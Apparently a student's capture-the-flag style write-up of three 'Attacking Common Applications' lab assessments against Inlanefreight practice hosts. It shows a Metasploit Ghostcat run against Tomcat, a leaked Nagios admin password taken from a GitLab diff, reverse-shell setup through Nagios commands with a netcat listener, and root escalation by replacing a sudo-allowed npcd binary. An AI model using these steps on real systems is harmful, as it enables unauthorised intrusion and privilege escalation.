
Attacking Common Applications - Skills Assessment I

---

During a penetration test against the company Inlanefreight, you have performed extensive enumeration and found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.


Q1. What vulnerable application is running?
![](Attachments/Pasted%20image%2020260924090442.png)
```
Tomcat
```
Q2. What port is this application running on?

```
8080
```
Q3. What version of the application is in use?

```
9.0.0.M1
```
Q4. Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.

```
msf auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.129.181.91
<?xml version="1.0" encoding="ISO-8859-1"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
[+] 10.129.181.91:8009 - File contents save to: /home/satoru/.msf4/loot/20260924092505_default_10.129.181.91_WEBINFweb.xml_918048.txt
[*] Auxiliary module execution completed

```

```
https://github.com/jaiguptanick/CVE-2019-0232
```

**Attacking Common Applications - Skills Assessment II

---

During an external penetration test for the company Inlanefreight, you come across a host that, at first glance, does not seem extremely interesting. At this point in the assessment, you have exhausted all options and hit several dead ends. Looking back through your enumeration notes, something catches your eye about this particular host. You also see a note that you don't recall about the `gitlab.inlanefreight.local` vhost.

Performing deeper and iterative enumeration reveals several serious flaws. Enumerate the target carefully and answer all the questions below to complete the second part of the skills assessment.

Q1. What is the URL of the WordPress instance?
![](Attachments/Pasted%20image%2020260924111057.png)

Q2. What is the name of the public GitLab project?
![](Attachments/Pasted%20image%2020260924110142.png)

Q3. What is the FQDN of the third vhost?

```
http://monitoring.inlanefreight.local/
```
Q4.  What application is running on this third vhost? (One word)

![](Attachments/Pasted%20image%2020260924111835.png)

Q5. What is the admin password to access this application ?
```
  

|   |
|---|
|@@ -17,7 +17,7 @@ $ createlang -U postgres -h 192.168.1.10 plpgsql postgres|
||||
|||$ psql -U postgres -h 192.168.1.10 postgres|
||||
|||postgres=# CREATE USER nagios WITH PASSWORD 'something_secret';|
|||postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';|
|||CREATE USER|
||||
||||
```

Q6. Obtain reverse shell access on the target and submit the contents of the flag.txt file.

![](Attachments/Pasted%20image%2020260924111736.png)

![](Attachments/Pasted%20image%2020260924115131.png)

```
step 1 

login

step 2

go to the ccm  > in commands > add command for a revshell > save and apply

step 3 

again in ccm go to services > add a new one > choose the command as one we created and run check command (nc listener should be active before that)


```

![](Attachments/Pasted%20image%2020260924115443.png)

```
nc -lvnp  4444                                                  
listening on [any] 4444 ...
connect to [10.10.15.155] from (UNKNOWN) [10.129.201.90] 55064
bash: cannot set terminal process group (31965): Inappropriate ioctl for device
bash: no job control in this shell
nagios@skills2:~$ whoami
whoami
nagios
sudo -l
```



```
sudo /etc/init.d/npcd stop
```

Confirm nothing is still using it:

```
ps aux | grep '[n]pcd'
```

If no `npcd` process remains, create the replacement again:

```
cat > /usr/local/nagios/bin/npcd <<'EOF'
#!/bin/bash
id > /tmp/npcd-proof
EOF
```

Then:

```
chmod +x /usr/local/nagios/bin/npcd
ls -l /usr/local/nagios/bin/npcd
```

Start it through the root-authorized service control:

```
sudo /etc/init.d/npcd start
```

Then:

```
cat /tmp/npcd-proof
```

If you get:

```
uid=0(root) ...
```

**Attacking Common Applications - Skills Assessment III

---

During our penetration test our team found a Windows host running on the network and the corresponding credentials for the Administrator. It is required that we connect to the host and find the `hardcoded password` for the MSSQL service.

Q1. What is the hardcoded password for the database connection in the MultimasterAPI.dll file?

![](Attachments/Pasted%20image%2020260924144448.png)